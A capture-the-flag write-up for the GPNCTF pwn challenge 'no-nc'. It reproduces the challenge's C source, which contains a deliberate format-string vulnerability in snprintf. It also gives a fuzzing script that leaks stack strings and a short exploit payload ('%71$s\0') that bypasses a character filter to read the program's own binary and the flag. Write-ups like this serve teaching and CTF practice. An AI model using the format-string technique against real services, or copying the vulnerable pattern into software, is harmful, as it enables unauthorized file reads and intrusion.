---
title: pwn - no-nc
---


Let's take a look at the source code of the challenge:

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>

#define RAW_FLAG "GPNCTF{fake_flag}"

char *FLAG = RAW_FLAG;

int no(char c)
{
    if (c == '.')
        return 1;
    if (c == '/')
        return 1;
    if (c == 'n')
        return 1;
    if (c == 'c')
        return 1;
    return 0;
}

char filebuf[4096] = {};
int main(int argc, char **argv)
{
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    char buf[200] = {};
    puts("Give me a file to read");
    read(STDIN_FILENO, buf, (sizeof buf) - 1);
    buf[sizeof buf - 1] = '\0';
    size_t str_len = strlen(buf);
    for (size_t i = 0; i < str_len; i++)
    {
        if (no(buf[i]))
        {
            puts("I don't like your character!");
            exit(1);
        }
    }
    char *filename = calloc(200, 1);
    snprintf(filename, (sizeof filename) - 1, buf); // Format-String Vulnerability
    puts("Will open:");
    puts(filename);
    int fd = open(filename, 0);
    if (fd < 0)
    {
        perror("open");
        exit(1);
    }
    while (1)
    {
        int count = read(fd, filebuf, (sizeof filebuf) - 1);
        if (count > 0)
        {
            write(STDOUT_FILENO, filebuf, count);
        }
        else
        {
            break;
        }
    }
}
```

We can see that the program reads a filename from the user and checks if it contains any of the characters `.`, `/`, `n`, and `c`. If it does, it exits with an error message. Otherwise, it opens the file and reads its contents. But there is a format string vulnerability in the `snprintf` function, which allows us to control the filename. So that I had write a fuzzing script to find the exactly index of the binary name `./nc` in the file system.

```python
from pwnie import *

context.log_level = 'error'
for i in range(0, 255):
    try:
        p = remote('0', 1337)

        sa(b'read\n', f'%{i}$s'.encode())
        ru(b'Will open:\n')

        data = rl()[:-1]
        print(f'[+] Data leak at index {i}: {data} ')

    except EOFError:
        close()
```

And I found that the binary name `./nc` is at index `71` and `122`. So that we can use `%s` to make a pointer to the binary name, when the binary open the file, it will open the `./nc` binary instead of the file we want to read. But note that the binary name is not null-terminated, so we need to add a null byte at the end of the string to avoid any issues.

```python collapse={1-40}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from subprocess import check_output
from time import sleep

context.log_level = 'debug'
context.terminal = ["wt.exe", "-w", "0", "split-pane", "--size", "0.65", "-d", ".", "wsl.exe", "-d", "Ubuntu-22.04", "--", "bash", "-c"]
exe = context.binary = ELF('./nc', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
b *main+513
c
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 5000)
        sleep(0.5)
        pid = int(check_output(["pidof", "-s", "/app/run"]))
        gdb.attach(int(pid), gdbscript=gdbscript+f"\n set sysroot /proc/{pid}/root\nfile /proc/{pid}/exe", exe=exe.path)
        pause()
        return p
    elif args.QEMU:
        if args.GDB:
            return process(["qemu-aarch64", "-g", "5000", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
        else:
            return process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", exe.path] + argv)
    else:
        return process([exe.path] + argv, aslr=True)

def debug():
    gdb.attach(p, gdbscript=gdbscript)
    pause()

# ==================== EXPLOIT ====================
p = start()

# debug()
sa(b'd\n', b'%71$s\0')

interactive()
# GPNCTF{up_and_DOWN_aL1_4rouND_60eS_th3_n_dimens1oN41_cIrcLe_wtF_15_tHiS_f1ag}
```
